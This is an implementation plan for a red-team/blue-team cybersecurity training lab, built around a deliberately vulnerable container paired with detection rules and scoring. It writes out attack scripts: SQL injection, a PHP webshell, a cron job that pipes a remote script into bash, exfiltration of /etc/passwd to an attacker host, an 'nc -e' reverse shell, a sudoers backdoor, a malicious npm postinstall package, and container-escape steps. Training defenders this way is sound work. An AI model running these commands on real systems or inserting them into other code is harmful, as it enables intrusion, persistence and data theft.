# Mini-SOC Lab: Implementation Phases

## PHASE BREAKDOWN (Actionable & Non-Ambiguous)

---

## PHASE 1: INFRASTRUCTURE & VULNERABLE VICTIM SETUP (Week 1-2)

### Phase 1.1: Vulnerable Victim Container Configuration

**Goal**: Create a Linux container with intentional vulnerabilities exploitable by each attack vector

**Deliverables**:

1. **Modify `containers/victim/Dockerfile`**
   - Base: Ubuntu 20.04 LTS
   - Install: Apache2, PHP 7.4, MySQL, OpenSSH, dnsmasq
   - Expose ports: 80, 22, 53, 3306
   - Create vulnerable PHP application in `/var/www/html/`
   - Set improper file permissions (chmod 777 on sensitive files)
   - Add default weak credentials: `victim:password123`

2. **Vulnerable Web Application** (`/var/www/html/`)
   - `index.php`: Login form with SQL injection vulnerability
     - Vulnerable query: `$query = "SELECT * FROM users WHERE username='$_GET[username]'"`
     - No input sanitization
   - `admin.php`: File upload with RCE capability
     - Upload `.php` files → execute as www-data
   - `config.php`: Contains hardcoded DB credentials
     - `$db_user = "root"`, `$db_pass = "rootpass"`

3. **SSH Hardening Issues**
   - `/etc/ssh/sshd_config`:
     - `PasswordAuthentication yes` (allow brute force)
     - `PermitRootLogin yes`
     - `StrictModes no` (allow weak key permissions)
   - Create default user: `www-data` with password `www-data`

4. **Privilege Escalation Vulnerability**
   - `/etc/sudoers`: `www-data ALL=(ALL) NOPASSWD: /bin/bash`
     - Allows www-data to run bash as root without password
   - Kernel vulnerability simulation: Create script to simulate cgroup escape
     - `/opt/escape_check.sh` (simulates privilege escalation check)

5. **Cron & Service Persistence Points**
   - Make `/var/spool/cron/crontabs/` writable by www-data (group perms)
   - Make `/etc/systemd/system/` writable for service creation
   - Minimal services running (sshd, apache2, mysql)

6. **DNS Configuration**
   - dnsmasq on port 53
   - Forward all queries to Google DNS
   - No DNSSEC enabled
   - Allow zone transfers (for testing DNS exploitation)

**Acceptance Criteria**:
- [ ] Container builds without errors
- [ ] All ports (80, 22, 53, 3306) accessible from host
- [ ] Web app vulnerability confirmed (can execute SQL injection)
- [ ] SSH accessible with default credentials
- [ ] Vulnerable sudoers entry confirmed

---

### Phase 1.2: Backend Services for Attack Orchestration

**Goal**: Extend backend controllers to accept and track attack vectors

**Deliverables**:

1. **Extend `RedTeamController.java`**
   ```
   POST /api/red/attack/start
   - Payload: attackVectorId (e.g., "web-sqli", "ssh-bruteforce")
   - Response: attackSessionId, targetEndpoint, startTime
   - Backend: Trigger attack script in attacker container
   
   GET /api/red/attack/{attackSessionId}/status
   - Response: currentStage, tasksCompleted, score, lastAction
   
   POST /api/red/attack/{attackSessionId}/next-step
   - Payload: technique (e.g., "T1190", "T1053")
   - Response: nextAvailableAction, prerequisites
   ```

2. **Extend `BlueTeamController.java`**
   ```
   GET /api/blue/alerts
   - Response: [{ alertId, technique, severity, timestamp, logEntry }]
   
   GET /api/blue/detection-status
   - Response: { vectorsDetected: [], vectorsBlocked: [], alertCount }
   
   POST /api/blue/remediate/{alertId}
   - Payload: remediationAction (e.g., "kill-process", "block-ip")
   - Response: success, actionLog
   ```

3. **Create `AttackVectorService.java`**
   - Map attack techniques to executable payloads
   - Track attack progression through kill chain
   - Calculate points based on stage completion
   - Manage attack session state

4. **Create `DetectionService.java`**
   - Parse logs from victim container
   - Match patterns against detection rules (DET-001, DET-002, etc.)
   - Generate alerts with MITRE technique mapping
   - Calculate detection accuracy/latency

---

### Phase 1.3: Real-time Logging & Monitoring Infrastructure

**Goal**: Collect victim logs and expose them to blue team dashboard

**Deliverables**:

1. **Victim Container Logging**
   - Mount `/var/log/` from victim to host for persistence
   - Run log collection agent:
     - Forward Apache logs to backend
     - Forward SSH logs to backend
     - Forward auditd logs to backend
     - Forward cron logs to backend
   - Format: JSON with timestamp, service, message

2. **Backend Log Streaming**
   - REST endpoint: `GET /api/logs/stream` (Server-Sent Events)
   - Stream logs in real-time to frontend
   - Filter by service type (ssh, apache, audit, cron)
   - Add detection rule evaluation inline

3. **Database Schema**
   - `alerts` table: (alertId, technique, severity, timestamp, vectorId, status)
   - `attack_sessions` table: (sessionId, vectorId, startTime, stage, score)
   - `detection_rules` table: (ruleId, technique, pattern, severity)
   - `remediation_actions` table: (actionId, alertId, action, status, timestamp)

---

## PHASE 2: ATTACK VECTOR IMPLEMENTATION (Week 2-3)

### Phase 2.1: VECTOR 1 - Web Application Exploitation

**Goal**: Implement complete SQL injection → RCE → Persistence chain

**Deliverables**:

1. **Attack Script** (`containers/attacker/attacks/vector1_web_sqli.sh`)
   ```bash
   # Step 1: Reconnaissance
   nmap -sV 127.0.0.1 -p 80
   curl -s http://127.0.0.1/index.php (identify web app)
   
   # Step 2: SQL Injection (T1190)
   SQL_PAYLOAD="admin' OR '1'='1' -- -"
   curl "http://127.0.0.1/index.php?username=$SQL_PAYLOAD"
   
   # Step 3: RCE via File Upload (T1190)
   # Upload PHP webshell to admin.php
   SHELL='<?php system($_GET["cmd"]); ?>'
   curl -F "file=@shell.php" http://127.0.0.1/admin.php
   
   # Step 4: Persistence - Cron (T1053)
   wget http://127.0.0.1/shell.php?cmd=whoami (verify execution)
   CRON_CMD='*/5 * * * * curl http://attacker:8080/beacon.sh | bash'
   curl http://127.0.0.1/shell.php?cmd="echo '$CRON_CMD' | crontab -"
   
   # Step 5: Exfiltration (T1041)
   wget http://127.0.0.1/shell.php?cmd="cat /etc/passwd" -O /tmp/exfil.txt
   curl -X POST -d @/tmp/exfil.txt http://attacker:8080/exfil
   ```

2. **Detection Rules** (Backend)
   ```
   DET-001: SQL Injection Pattern
   - Pattern: Single quote, OR, UNION, SELECT, DROP in URL params
   - Source: Apache access log
   - Action: Alert with severity HIGH
   - Remediation: Block IP for 5 min
   
   DET-002: PHP Process Child Execution
   - Pattern: apache2/www-data spawning bash/sh
   - Source: auditd logs (EXECVE records)
   - Action: Alert with severity CRITICAL
   - Remediation: Kill apache2 process, prompt blue team
   
   DET-003: Cron Modification
   - Pattern: /var/spool/cron/crontabs/ write operation
   - Source: auditd logs (OPEN, WRITE records)
   - Action: Alert with severity CRITICAL
   - Remediation: Remove cron entry
   
   DET-004: Outbound Connection from Web Server
   - Pattern: apache2 process making outbound TCP connection
   - Source: netstat logs or conntrack
   - Action: Alert with severity HIGH
   - Remediation: Block outbound traffic from web server
   ```

3. **Acceptance Criteria**:
   - [ ] SQL injection works (authenticate without password)
   - [ ] RCE achieved (execute arbitrary commands)
   - [ ] Cron persistence survives container restart
   - [ ] Blue team detects all 4 techniques
   - [ ] Exfiltration detected and blocked

---

### Phase 2.2: VECTOR 2 - SSH Brute Force & Lateral Movement

**Goal**: Implement SSH brute force → persistence → privilege escalation chain

**Deliverables**:

1. **Attack Script** (`containers/attacker/attacks/vector2_ssh_bruteforce.sh`)
   ```bash
   # Step 1: Service Enumeration (T1589)
   ssh-keyscan 127.0.0.1 2>/dev/null | tee ssh_keys.txt
   
   # Step 2: SSH Brute Force (T1110)
   hydra -l www-data -P /wordlist.txt ssh://127.0.0.1 -t 4 2>/dev/null
   # Expected result: www-data:www-data
   
   # Step 3: SSH Access & Key Injection (T1098)
   ssh-keygen -t rsa -N "" -f /tmp/attacker_key
   sshpass -p 'www-data' ssh www-data@127.0.0.1 "mkdir -p ~/.ssh"
   sshpass -p 'www-data' scp /tmp/attacker_key.pub www-data@127.0.0.1:~/.ssh/authorized_keys
   
   # Step 4: Credential Discovery (T1552)
   ssh -i /tmp/attacker_key www-data@127.0.0.1 "grep -r 'password\|API' /home/* 2>/dev/null"
   ssh -i /tmp/attacker_key www-data@127.0.0.1 "cat /var/www/html/config.php"
   
   # Step 5: Privilege Escalation (T1548)
   ssh -i /tmp/attacker_key www-data@127.0.0.1 "sudo -l" (check sudoers)
   ssh -i /tmp/attacker_key www-data@127.0.0.1 "sudo /bin/bash" (execute as root)
   
   # Step 6: Persistence as Root (T1547)
   ssh -i /tmp/attacker_key www-data@127.0.0.1 "sudo bash -c 'echo \"root root\" > /etc/sudoers.d/backdoor'"
   ```

2. **Detection Rules**:
   ```
   DET-004: Failed SSH Login Threshold
   - Pattern: 5+ "Invalid user" or "Failed password" in 60 seconds
   - Source: /var/log/auth.log
   - Action: Alert with severity HIGH, auto-block IP
   
   DET-005: SSH Key Injection
   - Pattern: ~/.ssh/authorized_keys modified
   - Source: auditd WRITE events on ~/.ssh/
   - Action: Alert with severity CRITICAL
   - Remediation: Restore authorized_keys from backup
   
   DET-006: Unauthorized sudo Execution
   - Pattern: "sudo" command executed with shell spawning
   - Source: auditd EXECVE records
   - Action: Alert with severity CRITICAL
   - Remediation: Kill SSH session
   
   DET-007: Sudoers File Modification
   - Pattern: /etc/sudoers* file modified
   - Source: auditd WRITE events
   - Action: Alert with severity CRITICAL
   - Remediation: Restore sudoers from backup
   ```

3. **Acceptance Criteria**:
   - [ ] Brute force cracks SSH in < 2 minutes
   - [ ] SSH key injection successful
   - [ ] Privilege escalation via sudo works
   - [ ] Blue team detects brute force after 5 attempts
   - [ ] Blue team alerts on key injection and sudo execution

---

### Phase 2.3: VECTOR 3 - DNS Poisoning & Malware Delivery

**Goal**: Implement DNS exploitation → malware download → persistence chain

**Deliverables**:

1. **Attack Script** (`containers/attacker/attacks/vector3_dns_poison.sh`)
   ```bash
   # Step 1: DNS Enumeration (T1590)
   nslookup -type=ANY 127.0.0.1 127.0.0.1 (DNS zone info)
   dig @127.0.0.1 axfr example.com 2>/dev/null (zone transfer attempt)
   
   # Step 2: DNS Spoofing Setup (T1584)
   # Modify dnsmasq to redirect requests
   # Add to /etc/dnsmasq.conf: address=/update.example.com/192.168.1.100
   # This makes victim resolve update.example.com to attacker IP
   
   # Step 3: Malware Delivery (T1566)
   # Host malicious binary on attacker web server
   # Example: /opt/malware/backdoor.bin
   # Victim downloads: curl http://update.example.com/backdoor.bin -o /tmp/update.bin
   
   # Step 4: Service Persistence (T1547)
   # Create systemd service:
   cat > /tmp/update.service <<EOF
   [Unit]
   Description=System Update Service
   After=network.target
   [Service]
   Type=simple
   ExecStart=/tmp/update.bin
   Restart=on-failure
   EOF
   # Copy to /etc/systemd/system/ and enable
   
   # Step 5: C2 Beacon (T1041)
   # Malware binary executes beacon:
   /tmp/update.bin --beacon http://attacker:8080/c2 --interval 30
   # Sends system info to C2 every 30 seconds
   ```

2. **Malware Binary Simulation** (`containers/attacker/attacks/backdoor.bin`)
   - Bash script compiled/obfuscated as binary
   - Contains:
     - System info gathering (uname, whoami, ps aux)
     - File exfiltration capability
     - C2 beacon functionality
     - Cleanup/anti-forensics

3. **Detection Rules**:
   ```
   DET-008: DNS Query Anomaly
   - Pattern: Zone transfer attempt (AXFR query)
   - Source: dnsmasq logs
   - Action: Alert with severity MEDIUM
   
   DET-009: Unusual HTTP Download
   - Pattern: Binary/executable file download to /tmp/
   - Source: Apache access logs, file type detection
   - Action: Alert with severity HIGH
   - Remediation: Quarantine file, analyze with MalwareWorkbench
   
   DET-010: Service Creation
   - Pattern: New .service file in /etc/systemd/system/
   - Source: auditd WRITE events
   - Action: Alert with severity CRITICAL
   - Remediation: Remove service, list enabled services
   
   DET-011: Beacon Traffic
   - Pattern: Periodic HTTP POST to unknown C2 server
   - Source: netflow/tcpdump
   - Action: Alert with severity CRITICAL
   - Remediation: Block destination IP/domain
   ```

4. **Acceptance Criteria**:
   - [ ] DNS zone transfer attempt detected
   - [ ] Malware binary downloaded to victim
   - [ ] Service created and persists
   - [ ] C2 beacon established
   - [ ] Blue team detects all stages

---

### Phase 2.4: VECTOR 4 - Supply Chain Compromise

**Goal**: Implement compromised dependency → backdoor → persistence chain

**Deliverables**:

1. **Compromised Dependency**
   - Create fake npm package: `system-updater@1.0.0`
   - Post-install script executes malware payload
   - `package.json`:
     ```json
     {
       "name": "system-updater",
       "version": "1.0.0",
       "description": "System update checker",
       "scripts": {
         "postinstall": "node index.js"
       }
     }
     ```
   - `index.js`: Hidden backdoor code that:
     - Creates systemd service
     - Establishes C2 connection
     - Spawns reverse shell

2. **Attack Script** (`containers/attacker/attacks/vector4_supply_chain.sh`)
   ```bash
   # Step 1: Identify Target Application (T1195)
   curl http://127.0.0.1/package.json (identify app dependencies)
   
   # Step 2: Inject Malicious Dependency (T1195)
   # In victim app's package.json, replace legitimate package with backdoored version
   # Example: "lodash": "4.17.21" → "lodash": "npm:system-updater@1.0.0"
   
   # Step 3: Trigger Dependency Install (T1027)
   # Force npm install via:
   npm update
   # OR via application restart (postinstall script runs)
   
   # Step 4: Obfuscation & Execution (T1027, T1036)
   # Backdoor code runs during postinstall
   # Creates hidden process named "node-updater"
   
   # Step 5: Persistence via Service (T1547)
   # Postinstall creates: /etc/systemd/system/node-updater.service
   systemctl enable node-updater.service
   systemctl start node-updater.service
   
   # Step 6: Establish C2 (T1041)
   # Service maintains reverse shell to attacker
   nc -e /bin/bash attacker 4444
   ```

3. **Detection Rules**:
   ```
   DET-012: Dependency Integrity Check
   - Pattern: package-lock.json checksum mismatch
   - Source: npm audit, lockfile verification
   - Action: Alert with severity HIGH
   - Remediation: Rollback to previous lockfile
   
   DET-013: Suspicious npm postinstall
   - Pattern: postinstall script contains network/shell commands
   - Source: package.json analysis
   - Action: Alert with severity CRITICAL
   - Remediation: Uninstall package
   
   DET-014: Unusual Process Ancestry
   - Pattern: npm spawning bash/nc/shell
   - Source: auditd EXECVE records
   - Action: Alert with severity CRITICAL
   - Remediation: Kill process tree
   
   DET-015: Network Connection from Node Process
   - Pattern: node process making outbound connection
   - Source: netflow/netstat
   - Action: Alert with severity HIGH
   - Remediation: Block destination
   ```

4. **Acceptance Criteria**:
   - [ ] Malicious npm package created
   - [ ] Postinstall script executes automatically
   - [ ] Persistence service created
   - [ ] C2 connection established
   - [ ] Blue team detects integrity mismatch

---

### Phase 2.5: VECTOR 5 - Container Escape (Optional/Advanced)

**Goal**: Implement container escape → host compromise chain

**Deliverables**:

1. **Attack Script** (`containers/attacker/attacks/vector5_container_escape.sh`)
   ```bash
   # Step 1: Verify Container Runtime (T1610)
   docker ps (if accessible)
   mount | grep docker
   ls -la /proc/self/cgroup | grep docker
   
   # Step 2: Exploit Container Escape (T1611)
   # Technique 1: Cgroup v1 exploitation
   mkdir -p /tmp/cgroup && mount -t cgroup -o memory /tmp/cgroup
   mkdir /tmp/cgroup/test
   echo $$ > /tmp/cgroup/test/cgroup.procs
   
   # Technique 2: Privileged Container Exploitation
   # If container runs with --privileged:
   mount -o remount,rw /
   chroot /mnt/host /bin/bash
   
   # Step 3: Host Persistence (T1053, T1547)
   # From host context, write to /mnt/host/etc/cron.d/
   echo "*/5 * * * * root /tmp/beacon.sh" > /mnt/host/etc/cron.d/backdoor
   
   # Step 4: Disable Host Firewall (T1562)
   iptables -F (flush rules)
   ip6tables -F
   
   # Step 5: Exfiltrate Host Data (T1041)
   tar czf /tmp/host-data.tar.gz /mnt/host/home /mnt/host/root
   curl -F "file=@/tmp/host-data.tar.gz" http://attacker:8080/exfil
   ```

2. **Detection Rules**:
   ```
   DET-016: Cgroup Escape Attempt
   - Pattern: cgroup mounting, cgroup_event_control writes
   - Source: auditd logs
   - Action: Alert with severity CRITICAL
   
   DET-017: Host Filesystem Access
   - Pattern: /mnt/, /proc, /sys mount operations from container
   - Source: Docker event logging
   - Action: Alert with severity CRITICAL
   - Remediation: Kill container
   
   DET-018: Host Firewall Modification
   - Pattern: iptables/ip6tables rule changes
   - Source: auditd EXECVE events
   - Action: Alert with severity CRITICAL
   - Remediation: Restore firewall rules
   ```

3. **Acceptance Criteria**:
   - [ ] Cgroup escape detection
   - [ ] Host filesystem access blocked
   - [ ] Firewall rule modification detected

---

## PHASE 3: BLUE TEAM DETECTION & RESPONSE (Week 3-4)

### Phase 3.1: Frontend Detection Dashboard

**Goal**: Extend existing BlueTeamSOC.jsx with real-time attack tracking

**Deliverables**:

1. **AlertsPanel Enhancement**
   - Display alerts in real-time from backend `/api/blue/alerts`
   - Show: alertId, technique (T-code), vector name, severity, timestamp
   - Color-code: RED (critical), YELLOW (medium), BLUE (informational)
   - Action buttons: "Investigate", "Remediate", "Dismiss"

2. **LiveLog Enhancement**
   - Timeline view: Show attack sequence vs detection sequence
   - Red dots: Attack techniques executed
   - Green dots: Detection alerts triggered
   - Blue dots: Remediation actions taken
   - Show latency: "Detected in 2.3 seconds"

3. **NetworkMonitor Enhancement**
   - Graph view: Victim node → external connections
   - Show suspicious flows: SQL injection attempts, SSH brute force, exfiltration
   - Traffic volume anomaly highlight

4. **New Component: Kill Chain Progress**
   - Visual pipeline: Recon → Initial Access → Persistence → Priv Esc → Exfil
   - Mark each stage: COMPLETED (red), BLOCKED (green), IN-PROGRESS (yellow)
   - Show which vector is active

5. **New Component: MITRE Technique Mapper**
   - Display detected techniques with T-codes
   - Show: Technique name, MITRE description, detection rule used
   - Mitigation strategies displayed below

---

### Phase 3.2: Backend Detection Engine

**Goal**: Implement detection rule evaluation and alert generation

**Deliverables**:

1. **Create `DetectionRuleEngine.java`**
   ```java
   public interface DetectionRule {
       DetectionAlert evaluate(LogEntry log);
   }
   
   // SQL Injection Detection (DET-001)
   public class SqlInjectionRule implements DetectionRule {
       private String[] sqlKeywords = {"' OR '", "UNION SELECT", "DROP TABLE"};
       public DetectionAlert evaluate(LogEntry log) {
           if (log contains any sqlKeywords) {
               return new DetectionAlert("DET-001", "T1190", "SQL Injection", "HIGH");
           }
       }
   }
   
   // Cron Modification (DET-003)
   public class CronModificationRule implements DetectionRule {
       public DetectionAlert evaluate(LogEntry log) {
           if (log.path.contains("/var/spool/cron") && log.action == "WRITE") {
               return new DetectionAlert("DET-003", "T1053", "Cron Persistence", "CRITICAL");
           }
       }
   }
   ```

2. **Create `LogAggregationService.java`**
   - Collect logs from victim container
   - Parse Apache logs, SSH logs, auditd logs
   - Convert to standardized LogEntry objects
   - Push to detection engine every 1 second

3. **Correlation Engine**
   - Multi-event correlation: SQL injection → PHP process spawning → outbound connection
   - Score: Single alert = 20 pts, Correlated alert = 100 pts
   - Reduce false positives: Require 2+ correlated events for CRITICAL

4. **Alert Routing**
   - Store alerts in database
   - Expose via REST endpoint: `GET /api/blue/alerts`
   - WebSocket stream for real-time push to frontend

---

### Phase 3.3: Automated Remediation Actions

**Goal**: Enable blue team to perform automated response actions

**Deliverables**:

1. **Remediation Actions** (Backend)
   ```
   POST /api/blue/remediate/{alertId}
   
   Available actions per technique:
   - T1190 (SQL Injection): Block IP, Kill Apache, Restore DB backup
   - T1110 (SSH Brute Force): Block IP, Force SSH key-only auth
   - T1053 (Cron Persistence): Remove cron entry, Kill process
   - T1584 (DNS Poison): Flush DNS cache, Restart dnsmasq
   - T1547 (Service Persistence): Remove service, Disable systemd
   ```

2. **Remediation Execution**
   - Execute commands in victim container
   - Log all actions in `remediation_actions` table
   - Track: actionId, alertId, action, status, timestamp, result

3. **Manual Operator Terminal** (OperatorTerminal component)
   - Blue team can execute custom commands
   - Commands: iptables, kill, systemctl, etc.
   - Restricted to read-only safe commands (no destructive without confirmation)

---

## PHASE 4: SCORING & GAME MECHANICS (Week 4)

### Phase 4.1: Scoring Engine

**Goal**: Track and calculate points for both red and blue teams

**Deliverables**:

1. **Create `ScoringService.java`**
   ```
   // Initial Access Stage
   if (blueTeamBlocksInitialAccess) {
       blueScore += 150; // Maximum points for early detection
       redScore += 0;
   } else if (redGainsInitialAccess) {
       redScore += 50;
       blueScore += 0;
   }
   
   // Persistence Stage
   if (blueDetectsPersistence) {
       blueScore += 100;
       redScore -= 25; // Penalty for detection
   } else if (redEstablishesPersistence) {
       redScore += 75;
   }
   
   // Privilege Escalation
   if (redAchievesRootAccess) {
       redScore += 100;
   } else if (blueDetectsPrivEsc) {
       blueScore += 75;
   }
   
   // Exfiltration
   if (redExfiltratesData) {
       redScore += 200; // Maximum points
   } else if (blueBlocksExfiltration) {
       blueScore += 50;
   }
   
   // Time Bonuses
   if (redCompletes < 5 minutes) {
       redScore += 50;
   }
   if (blueDetects < 2 minutes) {
       blueScore += 25;
   }
   ```

2. **Score Tracking Database Schema**
   - `game_sessions` table: gameId, startTime, endTime, redTeamScore, blueTeamScore
   - `game_events` table: eventId, gameId, timestamp, type (attack/detection), points
   - `leaderboard` table: userId, totalGames, wins, avgScore

3. **Real-time Score Display**
   - Create `StatCard` components showing:
     - Red Score (current)
     - Blue Score (current)
     - Difference
     - Time elapsed
   - Update every 1 second via WebSocket

---

### Phase 4.2: Game State Management

**Goal**: Track game progression and end conditions

**Deliverables**:

1. **Game States**
   ```
   SETUP → RECON_PHASE → ATTACK_SELECTION → ACTIVE_ATTACK → DETECTION → END
   ```

2. **End Conditions**
   ```
   RED WINS: If exfiltration completes
   BLUE WINS: If all attack vectors are blocked
   DRAW: If timer expires (30 minutes)
   ```

3. **GameOverModal Enhancement**
   - Display final scores
   - Show attack path taken (which vectors were attempted)
   - Show detection/blocking timeline
   - Highlight best defense: "Blocked at Persistence stage"
   - Offer rematch or vector selection

---

## PHASE 5: INTEGRATION & TESTING (Week 5)

### Phase 5.1: End-to-End Testing

**Goal**: Validate all components work together

**Test Cases**:

1. **Vector 1 (Web App)**
   - [ ] Attacker executes SQL injection
   - [ ] Blue team detects within 3 seconds
   - [ ] Remediation blocks attacker
   - [ ] Score updates correctly
   - [ ] Frontend shows complete timeline

2. **Vector 2 (SSH Brute Force)**
   - [ ] Attacker brute forces SSH
   - [ ] Blue team detects after 5 attempts
   - [ ] IP auto-blocked
   - [ ] Persistence attempt blocked
   - [ ] Score reflects early detection bonus

3. **Vector 3 (DNS Poisoning)**
   - [ ] DNS zone transfer attempted
   - [ ] Malware binary downloaded
   - [ ] Service created
   - [ ] All stages detected
   - [ ] C2 connection blocked

4. **Vector 4 (Supply Chain)**
   - [ ] Malicious npm package installed
   - [ ] Postinstall script executes
   - [ ] Persistence service created
   - [ ] Blue team detects integrity mismatch
   - [ ] Package uninstalled via remediation

5. **Vector 5 (Container Escape)** *(if implemented)*
   - [ ] Container escape attempted
   - [ ] Host filesystem access detected
   - [ ] Container killed
   - [ ] Attack failed with score loss

### Phase 5.2: Performance & Scalability

- [ ] Backend handles 100+ alerts/minute
- [ ] Frontend updates in < 500ms latency
- [ ] Database queries < 100ms
- [ ] Detection latency < 3 seconds
- [ ] WebSocket streaming stable over 1+ hour

### Phase 5.3: Documentation

- [ ] Attacker guide: How to execute each vector
- [ ] Defender guide: Detection strategies, remediation steps
- [ ] Architecture docs: Component interactions, data flow
- [ ] API docs: All REST endpoints, payloads, responses

---

## TIMELINE SUMMARY

| Phase | Week | Key Deliverables | Owner |
|-------|------|------------------|-------|
| 1.1 | W1 | Vulnerable victim VM | Infrastructure |
| 1.2 | W1 | Backend attack/detection controllers | Backend |
| 1.3 | W1-2 | Logging & monitoring setup | DevOps |
| 2.1 | W2 | Vector 1 (Web App) | Red Team |
| 2.2 | W2 | Vector 2 (SSH Brute Force) | Red Team |
| 2.3 | W2-3 | Vector 3 (DNS Poisoning) | Red Team |
| 2.4 | W3 | Vector 4 (Supply Chain) | Red Team |
| 2.5 | W3 | Vector 5 (Container Escape) | Red Team (Optional) |
| 3.1 | W3 | Blue team dashboard | Frontend |
| 3.2 | W3-4 | Detection engine | Backend |
| 3.3 | W4 | Automated remediation | Backend |
| 4.1 | W4 | Scoring system | Backend |
| 4.2 | W4 | Game state management | Backend |
| 5.1 | W5 | E2E testing | QA |
| 5.2 | W5 | Performance tuning | DevOps |
| 5.3 | W5 | Documentation | Tech Writer |

---

## Success Checklist

✅ All 5 attack vectors fully functional
✅ Each vector chains 3-5 MITRE techniques
✅ Detection rules prevent/detect 95%+ of techniques
✅ Blue team score reflects early detection bonus
✅ Red team score reflects deep penetration bonus
✅ Real-time frontend updates < 1 second latency
✅ Remediation actions reduce attack success rate
✅ Complete MITRE ATT&CK mapping documented
✅ Attack path visualization clear and intuitive
✅ No critical security issues in test runs

